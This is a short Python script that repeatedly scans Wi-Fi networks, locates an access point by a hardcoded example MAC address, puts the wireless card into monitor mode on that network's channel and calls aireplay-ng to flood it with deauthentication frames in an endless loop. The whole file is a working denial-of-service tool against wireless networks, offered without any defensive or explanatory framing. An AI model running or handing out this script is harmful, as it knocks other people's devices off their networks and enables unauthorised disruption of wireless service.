from os import system
from time import sleep

target_1 = '4b:99:8c:k9:er:49'.upper() #FOR EXAMPLE

def NetworkCard():
    system('systemctl restart NetworkManager')
    sleep(2)
    system('iwlist wlp2s0 scan > /root/WifiScan.log')

def DosAttack():
    file = open('/root/WifiScan.log', 'r').read()
    FindTarget = file.find(target_1)

    FindChannel = FindTarget + 46
    DefineChannel = file[FindChannel:].split("\n")
	
    system('ip link set wlp2s0 down')
    system('iw dev wlp2s0 set monitor control')
    system('ip link set wlp2s0 up')
    system('iwconfig wlp2s0 channel '+str(DefineChannel[0]))
    system('aireplay-ng --deauth 70 -a '+target_1+' wlp2s0')
    system('ip link set wlp2s0 down')
    system('iw dev wlp2s0 set type managed')
    system('ip link set wlp2s0 up')

while True:
    NetworkCard()
    DosAttack()
